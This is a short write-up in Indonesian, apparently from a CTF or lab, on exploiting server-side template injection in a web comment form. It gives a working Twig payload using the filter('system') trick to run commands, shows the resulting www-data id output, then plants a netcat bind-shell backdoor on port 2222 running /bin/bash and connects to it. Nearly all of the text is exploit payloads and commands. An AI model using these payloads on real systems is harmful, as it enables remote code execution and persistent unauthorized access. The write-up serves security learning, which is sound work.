
Lakukan SSTI ke comment section
```
What is your name?
`
asdasd
`

What is your comment?
`
{{['id']|filter('system')}}
`
```
dan kita akan mendapat display id `uid=33(www-data) gid=33(www-data) groups=33(www-data) Array`

selanjutnya kita bisa coba untuk pasang backdoor dengan port open
```
What is your comment?
`
{{['nc -lvnp 2222 -e /bin/bash']|filter('system')}}
`
```
selanjutnya kita connect ke backdoor dengan cara
```
nc -vn IP-target 2222
```

